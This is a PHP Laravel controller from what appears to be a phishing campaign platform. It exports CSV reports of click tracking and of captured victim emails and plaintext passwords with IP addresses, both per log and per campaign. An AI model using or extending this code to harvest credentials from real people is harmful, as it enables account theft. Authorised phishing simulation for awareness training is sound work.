<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Http\Response;
use App\Models\Phishinglog;
use App\Models\Clicklog;
use App\Models\Campaign;

class ExportController extends Controller
{
    public function exportPhishingLogs(Request $request): Response
    {
        $query = Phishinglog::with('campaign');
        
        if ($request->campaign_id) {
            $query->where('campaign_id', $request->campaign_id);
        }
        
        $logs = $query->latest()->get();
        
        $filename = 'phishing_logs_' . date('Y-m-d_H-i-s') . '.csv';
        
        $headers = [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => "attachment; filename=$filename",
        ];
        
        $callback = function() use ($logs) {
            $file = fopen('php://output', 'w');
            fputcsv($file, ['Campaign', 'Email', 'Password', 'IP Address', 'User Agent', 'Captured At']);
            
            foreach ($logs as $log) {
                fputcsv($file, [
                    $log->campaign ? $log->campaign->subject : 'Unknown',
                    $log->email,
                    $log->password,
                    $log->ip_address,
                    $log->user_agent,
                    $log->created_at->format('Y-m-d H:i:s'),
                ]);
            }
            fclose($file);
        };
        
        return response()->stream($callback, 200, $headers);
    }

    public function exportClickLogs(Request $request): Response
    {
        $query = Clicklog::with('campaign');
        
        if ($request->campaign_id) {
            $query->where('campaign_id', $request->campaign_id);
        }
        
        $logs = $query->latest()->get();
        
        $filename = 'click_logs_' . date('Y-m-d_H-i-s') . '.csv';
        
        $headers = [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => "attachment; filename=$filename",
        ];
        
        $callback = function() use ($logs) {
            $file = fopen('php://output', 'w');
            fputcsv($file, ['Campaign', 'Visitor IP', 'User Agent', 'Referer', 'Clicked At']);
            
            foreach ($logs as $log) {
                fputcsv($file, [
                    $log->campaign ? $log->campaign->subject : 'Unknown',
                    $log->visitor_ip,
                    $log->user_agent,
                    $log->referer ?? 'Direct',
                    $log->created_at->format('Y-m-d H:i:s'),
                ]);
            }
            fclose($file);
        };
        
        return response()->stream($callback, 200, $headers);
    }

    public function exportCampaignReport(Campaign $campaign): Response
    {
        $filename = 'campaign_report_' . $campaign->id . '_' . date('Y-m-d_H-i-s') . '.csv';
        
        $headers = [
            'Content-Type' => 'text/csv',
            'Content-Disposition' => "attachment; filename=$filename",
        ];
        
        $callback = function() use ($campaign) {
            $file = fopen('php://output', 'w');
            
            // Campaign Summary
            fputcsv($file, ['Campaign Report']);
            fputcsv($file, ['Subject', $campaign->subject]);
            fputcsv($file, ['Status', ucfirst($campaign->status)]);
            fputcsv($file, ['Phishing Link', $campaign->phishing_link]);
            fputcsv($file, ['Created', $campaign->created_at->format('Y-m-d H:i:s')]);
            fputcsv($file, ['']);
            fputcsv($file, ['Statistics']);
            fputcsv($file, ['Total Clicks', $campaign->clicklogs()->count()]);
            fputcsv($file, ['Credentials Captured', $campaign->phishinglogs()->count()]);
            fputcsv($file, ['']);
            fputcsv($file, ['Credentials Captured']);
            fputcsv($file, ['Email', 'Password', 'IP Address', 'Captured At']);
            
            foreach ($campaign->phishinglogs()->latest()->get() as $log) {
                fputcsv($file, [
                    $log->email,
                    $log->password,
                    $log->ip_address,
                    $log->created_at->format('Y-m-d H:i:s'),
                ]);
            }
            
            fputcsv($file, ['']);
            fputcsv($file, ['Click Tracking']);
            fputcsv($file, ['Visitor IP', 'User Agent', 'Referer', 'Clicked At']);
            
            foreach ($campaign->clicklogs()->latest()->get() as $log) {
                fputcsv($file, [
                    $log->visitor_ip,
                    $log->user_agent,
                    $log->referer ?? 'Direct',
                    $log->created_at->format('Y-m-d H:i:s'),
                ]);
            }
            
            fclose($file);
        };
        
        return response()->stream($callback, 200, $headers);
    }
}
